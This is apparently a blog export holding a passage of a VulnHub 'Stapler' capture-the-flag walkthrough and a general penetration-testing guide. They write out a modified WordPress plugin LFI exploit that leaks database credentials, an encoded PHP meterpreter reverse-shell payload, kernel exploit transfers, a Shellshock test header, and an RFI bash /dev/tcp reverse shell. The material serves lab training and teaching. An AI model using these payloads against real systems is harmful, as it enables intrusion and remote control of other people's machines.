scanned in 4.98 secondsPerformed onetwopunch / nmap scansUsing the onetwopunch script which combines unicornscan and nmap I scanned the machine looking for open ports.root@sengen-kali:~/vulnhub/stapler# ~/onetwopunch.sh -t target.txt -p all -n &quot;-A -sV&quot;[*] TCP ports for nmap to scan: 21,22,53,80,139,666,3306,12380[*] UDP ports for nmap to scan: 53,137,45018Based on our initial scan the following software/versions are revealed21/tcp open ftp vsftpd 2.0.8 or later22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)53/tcp open domain dnsmasq 2.7580/tcp open http PHP cli server 5.5 or later139/tcp open netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)3306/tcp open mysql MySQL 5.7.12-0ubuntu112380/tcp open http Apache httpd 2.4.18 ((Ubuntu))Looking into web portsWill start by investigating the web ports which appear to be 80 and 12380Protip: when using curl against the sites you should add the --insecure or -k switch so that you get results back even if it doesn’t have a valid cert. If I did not do this I would have seen nothing come back for SSL on 12380root@sengen-kali:~/vulnhub/stapler# curl -s -k http://192.168.56.102:80 | html2text****** Not Found ******The requested resource / was not found on this server.root@sengen-kali:~/vulnhub/stapler# curl -s -k http://192.168.56.102:12380 | html2text****** Coming Soon ********* Sorry guys, BSides happened too quick! Didn&#39;t have enough time to finishthe website. ***** Try again next year. **Made with by Creative_Tim. Free download here.root@sengen-kali:~/vulnhub/stapler# curl -s -k https://192.168.56.102:12380 | html2textInternal Index Page!The web site on port 12380 seems to contain something of interest but we’ll gobuster them allroot@sengen-kali:~/vulnhub/stapler# gobuster -u http://192.168.56.102:80 -w /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txtGobuster v1.2 OJ Reeves (@TheColonial)=====================================================[+] Mode : dir[+] Url/Domain : http://192.168.56.102:80/[+] Threads : 10[+] Wordlist : /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txt[+] Status codes : 200,204,301,302,307=====================================================/.bashrc (Status: 200)/.profile (Status: 200)=====================================================root@sengen-kali:~/vulnhub/stapler# gobuster -u http://192.168.56.102:12380 -w /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txtGobuster v1.2 OJ Reeves (@TheColonial)=====================================================[+] Mode : dir[+] Url/Domain : http://192.168.56.102:12380/[+] Threads : 10[+] Wordlist : /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txt[+] Status codes : 200,204,301,302,307==========================================================================================================root@sengen-kali:~/vulnhub/stapler# gobuster -u https://192.168.56.102:12380 -w /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txtGobuster v1.2 OJ Reeves (@TheColonial)=====================================================[+] Mode : dir[+] Url/Domain : https://192.168.56.102:12380/[+] Threads : 10[+] Wordlist : /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txt[+] Status codes : 200,204,301,302,307=====================================================/announcements (Status: 301)/index.html (Status: 200)/javascript (Status: 301)/phpmyadmin (Status: 301)/robots.txt (Status: 200)=====================================================I noticed .bashrc and .profile files were on port 80 and looked at them with the following commands. These usually reside at the root of a users home directory so this is odd and may indicated that the port 80 web is actually mounted at an actual home directory (or this is a red herring to throw us off)root@sengen-kali:~/vulnhub/stapler# curl -s -k http://192.168.56.102:80/.bashrcroot@sengen-kali:~/vulnhub/stapler# curl -s -k http://192.168.56.102:80/.profileNothing of interest was in these files as they looked pretty normal to me.SSL on 12380SSL on 12380 is another story… a lot is going on here. Need to check robots.txt and /phpmyadmin is always a top targetroot@sengen-kali:~/vulnhub/stapler# curl -s -k https://192.168.56.102:12380/robots.txtUser-agent: *Disallow: /admin112233/Disallow: /blogblog/Tried default credentialsAttempted several default credentials against https://192.168.56.102:12380/phpmyadmin/index.php but none of them workedLooked at https://192.168.56.102:12380/admin112233When using curl the javascript doesn’t run but when navigating to it through the browser it does and states“This could of been a BeEF-XSS hook ;)” which doesn’t look like anything for us to exploit but it could be bade if we were hit with this for real in an actual environment (you would not see the message box of course).Looked at https://192.168.56.102:12380/blogblog/This is a WordPress blog site. Has a couple posts and the next thing should be running a wpscan against it to see if we can find any vulnerabilities with it.Ran WordPress Scan (wpscan)root@sengen-kali:~/vulnhub/stapler# wpscan --url https://192.168.56.102:12380/blogblog --disable-tls-checks[+] URL: https://192.168.56.102:12380/blogblog/[+] Started: Fri Jul 28 12:19:23 2017[!] The WordPress &#39;https://192.168.56.102:12380/blogblog/readme.html&#39; file exists exposing a version number[+] Interesting header: DAVE: Soemthing doesn&#39;t look right here[+] Interesting header: SERVER: Apache/2.4.18 (Ubuntu)[!] Registration is enabled: https://192.168.56.102:12380/blogblog/wp-login.php?action=register[+] XML-RPC Interface available under: https://192.168.56.102:12380/blogblog/xmlrpc.php[!] Upload directory has directory listing enabled: https://192.168.56.102:12380/blogblog/wp-content/uploads/[!] Includes directory has directory listing enabled: https://192.168.56.102:12380/blogblog/wp-includes/[+] WordPress version 4.2.1 (Released on 2015-04-27) identified from advanced fingerprinting, meta generator, readme, links opml, stylesheets numbers[!] 41 vulnerabilities identified from the version number&amp;lt;cut for brevity&amp;gt;A lot of XSS and CSRF vulnerabilites which probably won’t apply to us for this type of machine. The ones that stood out as possibilities are below:[!] Title: WordPress 3.5-4.7.1 - WP_Query SQL Injection&amp;lt;br /&amp;gt; Reference: https://wpvulndb.com/vulnerabilities/8730&amp;lt;br /&amp;gt; Reference: https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/&amp;lt;br /&amp;gt; Reference: https://github.com/WordPress/WordPress/commit/85384297a60900004e27e417eac56d24267054cb&amp;lt;br /&amp;gt; Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611&amp;lt;br /&amp;gt;[i] Fixed in: 4.2.12&amp;lt;br /&amp;gt;[!] Title: WordPress 2.3-4.7.5 - Host Header Injection in Password Reset&amp;lt;br /&amp;gt; Reference: https://wpvulndb.com/vulnerabilities/8807&amp;lt;br /&amp;gt; Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html&amp;lt;br /&amp;gt; Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html&amp;lt;br /&amp;gt; Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295&amp;lt;br /&amp;gt;Some directory listings are said to be available as well so it is always a good idea to check that out especially to find plugins used.Navigated to https://192.168.56.102:12380/blogblog/wp-content/uploads/ which was an empty directory. I did a quick check to see if I could “PUT” files there via the following command (PUT is not among the available VERBS):root@sengen-kali:~/vulnhub/stapler# curl -vX OPTIONS https://192.168.56.102:12380/blogblog/wp-content/uploads/ -k...&amp;lt; HTTP/1.1 200 OK&amp;lt; Date: Fri, 28 Jul 2017 12:27:51 GMT&amp;lt; Server: Apache/2.4.18 (Ubuntu)&amp;lt; Allow: GET,HEAD,POST,OPTIONS&amp;lt; Dave: Soemthing doesn&#39;t look right here&amp;lt; Content-Length: 0&amp;lt; Content-Type: httpd/unix-directory...WordPress PluginsThrough traversal I got to the plugins directory at https://192.168.56.102:12380/blogblog/wp-content/plugins/ which listed the following (NOTE: I also ran wpscan with --enumerate p but it did not show all of these plugins here so if you can get directory browsing you should always double-check what wpscan tells you):Some version information extracted from the files in the plugin directoriestwo-factor = not sureshortcode-ui = 0.4.0advanced video = 1.0Used searchsploit to check for any known issues and the following came up as the most promisingroot@sengen-kali:~/vulnhub/stapler# searchsploit advanced video----------------------------------------------------------------------------------------------- ---------------------------------- Exploit Title | Path | (/usr/share/exploitdb/platforms/)----------------------------------------------------------------------------------------------- ----------------------------------WordPress Plugin Advanced Video 1.0 - Local File Inclusion | php/webapps/39646.py----------------------------------------------------------------------------------------------- ----------------------------------I downloaded this python file and updated it for my targetChanged:url = &quot;http://127.0.0.1/wordpress&quot;Tourl = &quot;https://192.168.56.102:12380/blogblog&quot;I ran the script and it failed complaining about SSL issuesurllib2.URLError: &amp;lt;urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:661)&amp;gt;Fine, I can fix this script with some simple python changes to make it not care about that.Added the following to the top of the scriptimport ssl ctx = ssl.create_default_context()ctx.check_hostname = Falsectx.verify_mode = ssl.CERT_NONEMade the urlopen calls use this new context I createdChanged:objHtml = urllib2.urlopen(url + &#39;/wp-admin/admin-ajax.php?action=ave_publishPost&amp;amp;title=&#39; + str(randomID) + &#39;&amp;amp;short=rnd&amp;amp;term=rnd&amp;amp;thumb=../wp-config.php&#39;)To:objHtml = urllib2.urlopen(url + &#39;/wp-admin/admin-ajax.php?action=ave_publishPost&amp;amp;title=&#39; + str(randomID) + &#39;&amp;amp;short=rnd&amp;amp;term=rnd&amp;amp;thumb=../wp-config.php&#39;, context=ctx)Changed:objHtml = urllib2.urlopen(url + &#39;/?p=&#39; + str(id))To:objHtml = urllib2.urlopen(url + &#39;/?p=&#39; + str(id), context=ctx)Ran the exploit again and it successfully created a 260355091.jpeg file in the uploads directoryroot@sengen-kali:~/vulnhub/stapler# curl -k https://192.168.56.102:12380/blogblog/wp-content/uploads/260355091.jpeg...// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */define(&#39;DB_NAME&#39;, &#39;wordpress&#39;);/** MySQL database username */define(&#39;DB_USER&#39;, &#39;root&#39;);/** MySQL database password */define(&#39;DB_PASSWORD&#39;, &#39;plbkac&#39;);/** MySQL hostname */define(&#39;DB_HOST&#39;, &#39;localhost&#39;);...This gave us the credentials needed to log into the phpmyadmin siteOften you can update a page to put a reverse shell in. I often do this if a template/theme is available. It is possible that I could download the theme, update it, and then re-upload it to make this work with export/import.After browing in phpmyadmin for a little bit I realized that 3306 was open publically and it was MySQL. Maybe, if I’m lucky I can connect remotely and write shellcode through the SQL.Connecting to MySQL remotelyWe are connected and from experience my first test here is whether or not select into outfile works. If it does, then we can drop a shell file into the web directory to gain a shell.We know the end path is /blogblog/wp-content/uploads/ so we need to figure out where this is relative from. In general, the default locations to try are /var/www and /var/www/html. In this case, through trial-and-error I found that it was /var/www/https. The https instead of html for the directory tripped me up for awhile but finally got a good test file to drop into the uploads directory.Success!Creating real PHP shellcode and dropping it onto the server using the same techniqueroot@sengen-kali:~/vulnhub/stapler# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=443 -e php/base64 &amp;gt; shell.phpNo platform was selected, choosing Msf::Module::Platform::PHP from the payloadNo Arch selected, selecting Arch: php from the payloadFound 1 compatible encodersAttempting to encode payload with 1 iterations of php/base64php/base64 succeeded with size 1289 (iteration=0)php/base64 chosen with final size 1289Payload size: 1289 bytesThe resulting shellcode needs &amp;lt;?php ?&amp;gt; added into it turning it into the following&amp;lt;?php eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4xNjguNTYuMTAxJzsgJHBvcnQgPSA0NDM7IGlmICgoJGYgPSAnc3RyZWFtX3NvY2tldF9jbGllbnQnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigidGNwOi8veyRpcH06eyRwb3J0fSIpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gZWxzZWlmICgoJGYgPSAnZnNvY2tvcGVuJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoJGlwLCAkcG9ydCk7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBlbHNlaWYgKCgkZiA9ICdzb2NrZXRfY3JlYXRlJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOyAkcmVzID0gQHNvY2tldF9jb25uZWN0KCRzLCAkaXAsICRwb3J0KTsgaWYgKCEkcmVzKSB7IGRpZSgpOyB9ICRzX3R5cGUgPSAnc29ja2V0JzsgfSBlbHNlIHsgZGllKCdubyBzb2NrZXQgZnVuY3MnKTsgfSBpZiAoISRzKSB7IGRpZSgnbm8gc29ja2V0Jyk7IH0gc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRsZW4gPSBmcmVhZCgkcywgNCk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkbGVuID0gc29ja2V0X3JlYWQoJHMsIDQpOyBicmVhazsgfSBpZiAoISRsZW4pIHsgZGllKCk7IH0gJGEgPSB1bnBhY2soIk5sZW4iLCAkbGVuKTsg.JGxlbiA9ICRhWydsZW4nXTsgJGIgPSAnJzsgd2hpbGUgKHN0cmxlbigkYikgPCAkbGVuKSB7IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkYiAuPSBmcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRiIC49IHNvY2tldF9yZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgfSB9ICRHTE9CQUxTWydtc2dzb2NrJ10gPSAkczsgJEdMT0JBTFNbJ21zZ3NvY2tfdHlwZSddID0gJHNfdHlwZTsgZXZhbCgkYik7IGRpZSgpOw)); ?&amp;gt;Used the “select into outfile” MySQL statement to drop my shell into the uploads directorySetup multi/handler to recieve a shell and invoked shell.phpEscalation to rootGet ourselves a better PTYwhich python/usr/bin/python/usr/bin/python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39;www-data@red:/var/www/https/blogblog/wp-content/uploads$Gaining some information about the systemwww-data@red:/var/www/https/blogblog/wp-content/uploads$ uname -auname -aLinux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linuxwww-data@red:/var/www/https/blogblog/wp-content/uploads$ ls -l /etc/passwdls -l /etc/passwd-rw-r--r-- 1 root root 2908 Jun 4 2016 /etc/passwdwww-data@red:/var/www/https/blogblog/wp-content/uploads$ ls -l /etc/shadowls -l /etc/shadow-rw-r----- 1 root shadow 4518 Jun 5 2016 /etc/shadowwww-data@red:/tmp$ cat /etc/*release*cat /etc/*release*DISTRIB_ID=UbuntuDISTRIB_RELEASE=16.04DISTRIB_CODENAME=xenialDISTRIB_DESCRIPTION=&quot;Ubuntu 16.04 LTS&quot;NAME=&quot;Ubuntu&quot;VERSION=&quot;16.04 LTS (Xenial Xerus)&quot;ID=ubuntuID_LIKE=debianPRETTY_NAME=&quot;Ubuntu 16.04 LTS&quot;VERSION_ID=&quot;16.04&quot;HOME_URL=&quot;http://www.ubuntu.com/&quot;SUPPORT_URL=&quot;http://help.ubuntu.com/&quot;BUG_REPORT_URL=&quot;http://bugs.launchpad.net/ubuntu/&quot;UBUNTU_CODENAME=xenialSearching for kernel exploitroot@sengen-kali:~/vulnhub/stapler# searchsploit 4.4.0-21---------------------------------------------------- ---------------------------------- Exploit Title | Path | (/usr/share/exploitdb/platforms/)---------------------------------------------------- ----------------------------------Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilte | lin_x86-64/local/40049.c---------------------------------------------------- ----------------------------------Attempting exploitThis exploit breaks out into two files: decr.c and pwn.c so I extracted the source from the 40049.c file and copied them over to the target machine.www-data@red:/tmp$ wget http://192.168.56.101/decr.cwget http://192.168.56.101/decr.c--2017-07-28 14:37:32-- http://192.168.56.101/decr.cConnecting to 192.168.56.101:80... connected.HTTP request sent, awaiting response... 200 OKLength: 3571 (3.5K) [text/x-csrc]Saving to: &#39;decr.c&#39;decr.c 100%[===================&amp;gt;] 3.49K --.-KB/s in 0s 2017-07-28 14:37:32 (281 MB/s) - &#39;decr.c&#39; saved [3571/3571]www-data@red:/tmp$ wget http://192.168.56.101/pwn.cwget http://192.168.56.101/pwn.c--2017-07-28 14:37:42-- http://192.168.56.101/pwn.cConnecting to 192.168.56.101:80... connected.HTTP request sent, awaiting response... 200 OKLength: 1163 (1.1K) [text/x-csrc]Saving to: &#39;pwn.c&#39;pwn.c 100%[===================&amp;gt;] 1.14K --.-KB/s in 0s 2017-07-28 14:37:42 (158 MB/s) - &#39;pwn.c&#39; saved [1163/1163]Compiledwww-data@red:/tmp$ gcc decr.c -m32 -O2 -o decrgcc decr.c -m32 -O2 -o decrwww-data@red:/tmp$ gcc pwn.c -O2 -o pwngcc pwn.c -O2 -o pwnpwn.c: In function &#39;privesc&#39;:pwn.c:25:42: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast] commit_creds(prepare_kernel_cred((uint64_t)NULL));Ran exploitwww-data@red:/tmp$ ./decr./decrnetfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik[!] Decrementing the refcount. This may take a while...[!] Wait for the &quot;Done&quot; message (even if you&#39;ll get the prompt back).www-data@red:/tmp$ [+] Done! Now run ./pwn./pwn./pwn[+] Escalating privs...pwn: pwn.c:44: main: Assertion `!getuid()&#39; failed.Aborted (core dumped)www-data@red:/tmp$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)Failed… this did not work right.Looked at the exploit DB article again and it has a comment about “SMEP/SMAP bypass available in descr_v2.c”Reading more it seems this may not work for me due to it being in a VM as this exploit is against an issue in an Intel CPU that might not be emulated right in VirtualBox… or it just plain won’t work in this situation.Did some more searchsploit queries based on the machine being Ubuntu 16.04root@sengen-kali:~/vulnhub/stapler# searchsploit linux kernel 4.4 ubuntu 16.04---------------------------------------------------- ---------------------------------- Exploit Title | Path | (/usr/share/exploitdb/platforms/)---------------------------------------------------- ----------------------------------Linux Kernel 4.4 (Ubuntu 16.04) - &#39;BPF&#39; Privilege E | linux/local/40759.rbLinux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - &#39;A | lin_x86-64/local/40871.cLinux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilte | lin_x86-64/local/40049.cLinux Kernel 4.4.x (Ubuntu 16.04) - &#39;double-fdput() | linux/local/39772.txt---------------------------------------------------- ----------------------------------Narrowed down on the double-fdput() exploit. Link to Exploit-DB page with download to POC zip is here https://www.exploit-db.com/exploits/39772/.Transfering files to targetwww-data@red:/tmp$ wget http://192.168.56.101/compile.shwget http://192.168.56.101/compile.sh--2017-07-28 15:19:04-- http://192.168.56.101/compile.shConnecting to 192.168.56.101:80... connected.HTTP request sent, awaiting response... 200 OKLength: 155 [text/x-sh]Saving to: &#39;compile.sh&#39;compile.sh 100%[===================&amp;gt;] 155 --.-KB/s in 0s 2017-07-28 15:19:04 (24.5 MB/s) - &#39;compile.sh&#39; saved [155/155]www-data@red:/tmp$ wget http://192.168.56.101/doubleput.cwget http://192.168.56.101/doubleput.c--2017-07-28 15:19:17-- http://192.168.56.101/doubleput.cConnecting to 192.168.56.101:80... connected.HTTP request sent, awaiting response... 200 OKLength: 4188 (4.1K) [text/x-csrc]Saving to: &#39;doubleput.c&#39;doubleput.c 100%[===================&amp;gt;] 4.09K --.-KB/s in 0s 2017-07-28 15:19:17 (446 MB/s) - &#39;doubleput.c&#39; saved [4188/4188]www-data@red:/tmp$ wget http://192.168.56.101/hello.cwget http://192.168.56.101/hello.c--2017-07-28 15:19:26-- http://192.168.56.101/hello.cConnecting to 192.168.56.101:80... connected.HTTP request sent, awaiting response... 200 OKLength: 2186 (2.1K) [text/x-csrc]Saving to: &#39;hello.c&#39;hello.c 100%[===================&amp;gt;] 2.13K --.-KB/s in 0s 2017-07-28 15:19:26 (336 MB/s) - &#39;hello.c&#39; saved [2186/2186]www-data@red:/tmp$ wget http://192.168.56.101/suidhelper.cwget http://192.168.56.101/suidhelper.c--2017-07-28 15:19:37-- http://192.168.56.101/suidhelper.cConnecting to 192.168.56.101:80... connected.HTTP request sent, awaiting response... 200 OKLength: 255 [text/x-csrc]Saving to: &#39;suidhelper.c&#39;suidhelper.c 100%[===================&amp;gt;] 255 --.-KB/s in 0s 2017-07-28 15:19:37 (23.8 MB/s) - &#39;suidhelper.c&#39; saved [255/255]Compilingwww-data@red:/tmp$ ./compile.sh./compile.shdoubleput.c: In function &#39;make_setuid&#39;:doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast] .insns = (__aligned_u64) insns, ^doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast] .license = (__aligned_u64)&quot;&quot; ^Gaining root shell" }, { "title": "Penetration Testing Process", "url": "/posts/Penetration-Testing-Process/", "categories": "Blogging, Penetration-Testing", "tags": "hacking, penetration-testing", "date": "2017-07-17 12:00:00 -0700", "snippet": "The following is a general guideline for how I would start to attack a machine. I broke it down into enumeration, doing research on what I found, exploitation (either getting root or a low privilege), then attempting low-priv escalation. NOTE: These are generic guidelines where I have left out anything that is related to Offensive Security’s lab. Still, the following may be helpful if you’re not sure where to start or what to start using to make some progress. Hope it’s helpful for somebody.EnumerationNetwork EnumerationNetwork Port Scan - Utilize OneTwoPunch or NMAP to identify any running services on the remote system. Both will default to the 1,000 most popular ports. If you don’t find anything, try a full scan of all 65535 ports.Create a text file with the IP to be scanned:root@kali:~# echo 192.168.1.100 &amp;gt; target.txtRun onetwopunch.sh against the target to identify open TCP and UDP ports:~/onetwopunch.sh -t target.txt -i eth0 (Runs the scan on eth0 against the targets TCP ports.)~/onetwopunch.sh -t target.txt -i eth0 -p udp -n -A (Runs the scan on eth0 against the UDP ports and executes the -A flag when running NMAP.)~/onetwopunch.sh -t target.txt -i eth0 -n “-A -sV” (Runs the scan with both the -A and -sV flags set for nmap.)WiresharkWireshark is a network sniffer that collects network traffic and breaks it out into a human readable format. It is very good at showing communications between systems and provides insight into what a system is sending. It can be used to identify windows traffic, sniff for passwords, look for hidden shares and to listen for responses to exploits you are executing over the network. Sometimes an exploit is trying to do something different than you think and it can be helpful to see all of the network traffic to clearly see what communications are going on between your system and the target’s. I find it helpful to have Wireshark running at all times during a pen test so I can review the packets as needed.Port KnockingSomething to be aware of is that some systems have ports that will only become open after a port knocking sequence. This is something that you may be clued into for a system (particularly for CTF machines) but this is also a legitimate technique to hide ports in production systems as well. If you have an idea of what three ports may unlock other ports you can use the following nmap command to initiate the sequence. NOTE: After running this you should perform a full port scan again to see if any ports opened up (they can be odd ports so a top-ports scan is not advised).Port knocking with nmap: knocks ports 1, 2, 3root@kali:~# nmap 10.10.1.104 -Pn -sS -p 1-3root@kali:~# nmap 10.10.1.104 -p-An additional tool that I use most often for port knocking is knock-knock which is a python script that can be found below.https://github.com/pan0pt1c0n/knock-knockDNS EnumerationEnumeration of the host names used by systems can help to define and identify the types of servers on a corporate network. If zone transfers are not properly secured, you can pull the entire list of servers by IP and hostname greatly improving the enumeration of a network.The ‘host’ command is used to query DNS from linux.root@kali:~# host -l &amp;lt;domain-name-here&amp;gt; (request a zone transfer from the &amp;lt;domain-name-here&amp;gt; domain)Web EnumerationUse tools to test for vulnerabilities on found web ports. Tools such as nikto, curl, gobuster, dirbuster, and burpsuite can all be used to enumerate any web server vulnerabilities, running software such as PHP, perl, and python, unlinked directories that can be accessed directly and any files within them, documents such as readme that will provide version information etc.NiktoNikto will crawl the webserver looking for known directories and testing for vulnerable settings and software. It can take quite some time but will provide a good idea of places to start testing.root@kali:~# nikto -host 192.168.1.100Gobuster and DirbusterGobuster and dirbuster are directory and file enumeration tools that use a list of file/directory names to brute force test whether they exist on a target system. Both can be used with BurpSuite as their proxy so that the content tested is collected and easily reviewed and tested against. I would recommend always using BurpSuite as the proxy for these tools. Gobuster will be explained here but dirbuster is very similar. Gobuster is better at pinpoint testing against each directory where dirbuster can be used to try to run as many different combinations as possible. I find gobuster more methodical.Run gobuster against a directory with a provided wordlist, found in the Kali Linux installation and use the local BurpSuite application as a web proxy:root@kali:~# gobuster -u http://192.168.1.100/ -w /usr/share/seclists/Discovery/Web_Content/common.txt -p http://127.0.0.1:8080CurlCurl is a command line tool to query web servers and other network ports. It is very useful for identifying versions through banner grabs (such as with FTP) as well as parsing web pages into a text readable and command line tool manipulable format. It can also be used to automate attacks that use a URL insertion to simplify actions and make them more repeatable.Look at the Page Header and What is being Sent:root@kali:~# curl -v http://192.168.1.100/cgi-bin/admin.cgi -s &amp;gt;/dev/nullTest is you can execute a bash script from a header field:root@kali:~# curl -H &quot;User-Agent: () { :; }; /bin/bash -c &#39;echo aaaa; uname -a; echo zzzz;&#39;&quot; http://192.168.1.100/cgi-bin/admin.cgiQuery a webpage and output it to HTML2Text:root@kali:~# curl -vk https://192.168.1.100 | html2textEnumerate HTTP methods with curl:root@kali:~# curl -vX OPTIONS 192.168.1.100/testQuick test with curl of PUT option:root@kali:~# curl -vX PUT -d &quot;$(cat test.txt)&quot; 192.168.1.100/test/test.txtLFI/RFI DiscoveryYou can potentially detect if there are possible LFI’s or RFI’s via the “fimap” python script.root@kali:~# fimap.py -u &#39;http://192.168.1.100/test.php?file=bang&amp;amp;id=23&#39;WordPress EnumerationWordPress is commonly used for website presentation through themes. It’s multitude of plugins offer myriad avenues of potential vulnerabilities. Wpscan is a great tool to identify them.wpscanWpscan identifies the WordPress version and plugins installed and compares them against a list of known vulnerabilities which it lists out. It also provides the name of the current theme.Check WordPress and its plugins for vulnerabilities:root@kali:~# wpscan --url 192.168.1.100 --enumerate pWindows and Samba EnumerationEnumeration of windows and samba systems can provide lists of running services, known users, file shares, open network ports and more. If UDP port 135/137 are available, you are likely able to enumerate some items on the target.Enum4LinuxEnum4Linux (e4l) is a perl program that wraps several Samba tools into one. It uses smbclient, rpclient, net and nmblookup to pull as much information from the target as possible.Run all checks against the target:root@kali:~# enum4linux 192.168.1.100SMB ClientSMB Client is a Samba tool used for connecting to remote systems. It can be used to enumerate shares and to connect to them. It is used by e4l to do this very thing. If you find a share you wish to connect with however, you will need to use smbclient directly.List the network shares on the target:root@kali:~# smbclient -L 192.168.1.100Connect to the wwwroot share:root@kali:~# smbclient \\\\\\\\192.168.1.100\\\\wwwrootSNMP EnumerationSNMP tools provide information such as running processes, devices installed, memory information, user accounts, and much more. If SNMP is running it can greatly improve the amount of information known about a system. Snmp-check and snmpwalk are tools that can collect this information.snmp-checkSnmp-check gives a great human readable report on the SNMP information available.Enumarate the SNMP information on target:root@kali:~# snmp-check 192.168.1.100snmpwalkSnmpwalk is a less visually friendly command that can enumerate SNMP available information. It can be used to query specific SNMP strings however and is handy in that regard.Enumerate SNMP information on target:root@kali:~# snmpwalk -c public -v1 192.168.1.100Miscellaneous EnumerationSome tools can be used to query ports and services in different ways in order to glean more information from them. Netcat and nmap are both capable of running against targets to pull out banners and other information in order to identify the application and its version.netcat (nc)Netcat is the swiss army tool of network communication. It can be used to setup listeners, connect to ports, transfer files, initiate remote command lines and more. For enumeration, it is often used to connect to an open port and pull any information it receives, often from the banner.Query a web server on port 9000:root@kali:~# nc 192.168.1.100 9000nmapNmap is the king of network scanners and has many different functions it can perform including running scripts and shells. It is very good at enumerating ports and is used by the OneTwoPunch (12p) script mentioned above.Scan the top 1000 TCP ports and then attempt to determine the applications and versions running on open ports:root@kali:~# nmap 192.168.1.100 -AHTML SourceI try to view the page source for most home pages and custom web pages looking for comments or version information. It is good practice to check source all the time to help enumerate the website. You can also find hidden form fields and other information as well that can help you to understand how the site operates.ResearchVulnerability Research ToolsSearchsploitSearchsploit is a command line tool that checks the exploit-db database for known vulnerabilities with exploits. It is downloaded to the local system so all of the exploits are available. It can be updated regularly to ensure you have the latest exploits from the exploit-db.com database.Search for a known exploit for vsftpd.root@kali:~# searchsploit vsftpdWebGoogleThis is pretty obvious but worth mentioning, Google will likely bring up the following sites that are explained when searching for exploits but it’s also good to remember that you can refine its searches and it can be used to find weird looking bits of code etc. to help identify what app version you are seeing or to better enumerate what is going on with the target system. Don’t be afraid to search on even the most benign looking bit of text as it could be very specific to a certain application.CVEdetails.comThis site provides a list of known vulnerabilities and exploits that can be refined as desired. It shows a score relating to the risk of the item and can be handy in a quick review of vulnerabilities for an application. It can also provide details on what the vuln is and what is needed to exploit it.Exploit-db.comThis is the web site that provides the same information that searchsploit provides, plus things like raw code for the exploit as well as the ability to download the vulnerable version of the software, which can be very helpful in testing. The website requires a captcha to search from it’s main screen but if you search from Google and use site:exploit-db.com you can get to most pages directly. This is one of my favorites.Securityfocus.comThis site is kind of a general mixture of CVE and ExDB. It has writeups on vulns and links to exploits. I like it primarily because it may have additional exploits that are not found or easily identified by the others. Specifically I’ve had luck finding a python version of an exploit that was only in ruby or C. This makes it much easier to run.ExploitationSQL InjectionSQL Injection is the usage of SQL specific commands and special characters in input fields in order to break the current SQL statement and to insert your own desired statement. It is used in many different ways and changes with the underlying DB OS.A useful cheat sheet for injections can be found here: https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/Local File InclusionLocal File Inclusion or LFI is the calling of a file on the target system in an unexpected manner. It is often done through URL manipulation such as directory traversal.Example LFI Attackhttps://192.168.1.100/index.php?page=../../../../../../../etc/passwdRemote File InclusionRemote File Inclusion or RFI is the calling of a remote file, usually from your local system, from the target system. This is often done through URL manipulation.Example RFI Attackhttps://192.168.1.100/index.php?page=http://192.168.1.101/shell.php%00 (where 192.168.1.101 is your machine IP)This url calls a php file from the remote server, in this instance my attacking box, and executes the file locally to the target system. The %00 terminates the PHP.The code inside of the file would look something like this:&amp;lt;?php print shell_exec(&quot;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.101/443 0&amp;gt;&amp;amp;1&quot;);?&amp;gt;It assigns a bash shell to a listener and then initiates a call to my local system on port 443. Running a netcat listener on 443 will accept the reverse shell and I will have a shell with the privileges of the user the web server is running as.Password AttacksThere are many forms of password attacks, hash cracking, password guessing, hash passing, it is important to understand how authentication systems operate to assist in circumventing or compromising them.Hash CrackingThere are several websites that have publicly available rainbow tables that will take a provided hash and compare. They can be very helpful in finding basic passwords quickly.Two examples:https://crackstation.nethttps://hashkiller.co.ukJohnny or John the RipperJohnny is a password cracking program. It is a graphical version of John the Ripper. It can take a wordlist, hash it, then compare it against a list of hashes provided. 